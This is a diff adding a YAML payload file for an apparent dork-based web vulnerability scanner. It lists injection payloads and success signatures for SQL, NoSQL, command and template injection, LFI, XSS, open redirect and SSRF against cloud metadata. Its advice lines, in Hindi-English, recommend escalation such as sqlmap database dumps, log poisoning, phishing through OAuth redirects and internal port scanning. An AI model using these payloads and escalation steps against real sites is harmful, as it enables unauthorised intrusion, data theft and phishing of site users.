@@ -1,0 +1,57 @@
+sqli_error:
+  params: [id, pid, cat, item, page]
+  advice: 'sqlmap -u "URL" -p PARAM --batch --dbs'
+  payloads: ["'", "\"", "1'", "1'-- -", "' OR '1'='1"]
+  signals:
+    - {type: regex, pattern: 'SQL syntax|mysql_fetch|SQLSTATE|ORA-0\d{4}|Unclosed quotation|syntax error near|Warning.{0,20}mysqli?'}
+    - {type: length_delta, pct: 15}
+    - {type: status_change}
+sqli_bool:
+  params: [id, pid, cat]
+  advice: 'sqlmap -u "URL" -p PARAM --batch --technique=B'
+  pairs: [["1 and 1=1", "1 and 1=2"], ["1' and '1'='1", "1' and '1'='2"]]
+  signals:
+    - {type: pair_delta, pct: 10}
+lfi:
+  params: [file, path, doc, include, template, page, download]
+  advice: '/etc/passwd ke baad log poisoning ya php://input try karein'
+  payloads: ["../../../../etc/passwd", "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index"]
+  signals:
+    - {type: regex, pattern: 'root:x:0:0|daemon:x:|\[fonts\]|PD9waHA'}
+open_redirect:
+  params: [url, redirect, next, return, target, callback, dest]
+  advice: 'OAuth/SSO flow mein is param ko phishing ke liye test karein'
+  payloads: ["https://example.com/dorklens", "//example.com/dorklens"]
+  signals:
+    - {type: location_match, contains: "example.com"}
+xss_reflect:
+  params: [q, s, search, keyword, name]
+  advice: 'browser mein khol kar confirm karein, phir CSP check karein'
+  payloads: ["dorklens<svg/onload=alert(1)>", "\"><img src=x onerror=alert(1)>"]
+  signals:
+    - {type: reflect, raw: true}
+    - {type: length_delta, pct: 5}
+ssti:
+  params: [name, q, template, msg]
+  advice: 'engine pakadne ke liye {{7*7}} ke baad {{7*"7"}} aur {{config}} try karein'
+  payloads: ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]
+  signals:
+    - {type: regex, pattern: '(?<![0-9])49(?![0-9])'}
+ssrf:
+  params: [url, src, target, image, host, feed]
+  advice: 'metadata IP ke baad internal ports scan karein'
+  payloads: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/"]
+  signals:
+    - {type: regex, pattern: 'ami-id|instance-id|It works!|Welcome to nginx|Apache2 .*Default Page'}
+nosqli:
+  params: [id, user, username, email, login]
+  advice: 'JSON body wale POST endpoint par bhi yahi operator try karein'
+  payloads: ['{"$ne":null}', "[$ne]=1", "' || '1'=='1"]
+  signals:
+    - {type: length_delta, pct: 25}
+cmd_inject:
+  params: [id, cmd, host, ip, ping, domain]
+  advice: 'blind case mein `sleep 5` ya out-of-band DNS use karein'
+  payloads: ["1;id", "1|id", "$(id)", "`id`"]
+  signals:
+    - {type: regex, pattern: 'uid=\d+\([a-z_]+\).{0,40}gid=\d+'}
